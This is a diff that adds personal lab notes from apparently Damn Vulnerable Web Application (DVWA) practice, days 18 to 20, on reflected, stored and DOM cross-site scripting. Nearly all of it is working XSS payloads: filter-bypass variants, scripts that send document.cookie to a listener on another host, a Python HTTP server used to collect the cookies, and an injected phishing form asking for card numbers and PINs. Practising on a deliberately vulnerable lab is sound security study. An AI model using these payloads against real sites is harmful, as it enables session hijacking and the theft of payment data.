@@ -1,0 +1,80 @@
+Day 18  / XSS Reflected 
+http://192.168.1.33/DVWA-2.4/index.php
+<h1>aaa</h1>
+<script>alert(1);</script>
+<script>alert(document.cookie);</script>
+
+security=low; PHPSESSID=sb5nhnphb03o6cps25hs1kf79i
+
+terminal > tail -f /var/log/apache2/access.log | grep -i lol
+
+<script>window.location="http://www.google.com";</script>
+<script>window.location="http://192.168.1.33/?cookie="+document.cookie;</script>
+
+<script>window.location="http://192.168.1.33/xss/index.php?lol="+document.cookie;</script>
+
+
+
+<script>document.getElementsByClassName('vulnerable_code_area')[0].innerHTML = "Hacked";</script>
+
+
+Day19 / XSS Reflected
+
+Phishing
+<script></script>document.getElementsByClassName('vulnerable_code_area')[0].innerHTML = '<form action="http://192.168.1.33/?"><p>Verify your card and pin for update system</p>Card Number<input type="text" placeholder="XXXX-XXXX-XXXX-XXXX" name="card"><br/><br/>Pin Code <input type="password" placeholder=****** name="pin"><input type="submit" value="Update"></form>'</script>
+
+xss medium
+aaaa
+<h1>aaaa</h1>
+<sCript>alert(1);</script>
+
+xss high
+<img src=x onerror=alert(1)>
+
+
+="<svgaaaaa
+="<svg/onloadaaaa
+="<svg/onload=aaaa
+="<svg/onload=alert(1)>aaaaaa
+="<svg/onload=alert(1)aaaaaa
+="<svg/onload=alert(1)/aaaaaa
+="<svg/onload=alert(1)//aaaaaa
+="<svg/onload=alert(1)/////////////////////////////>aaaaaa
+="<svg/onload=alert(1)\aaaaaa
+="<svg/onload=alert(1)<!--aaaaaa
+
+
+
+
+brutelogic.com  >> xss lab
+
+
+day 20  (Stored XSS)
+install xss and sql iso file
+cmd >> python -m http.server 80
+
+
+admin cookie command line
+<script>document.write('Hello<img src="http://192.168.1.112/?admin=' +document.cookie+'" width="0" height="0">');</script>
+
+
+run dvwa
+sudo service apache2 start
+sudo service mysql start
+
+Stored XSS meidum
+<sCRipt>alert(1)</sCRipt>
+
+high
+<img src=x onerror=alert(1)>
+
+
+
+DOM XSS  low
+url > default=French</script><script>alert(1);</script>
+
+DOM XSS medium
+url > default=French</option></select><img src=x onerror=alert(1)>
+
+high
+url> default=French#</option></select><img src=x onerror=alert(1)>
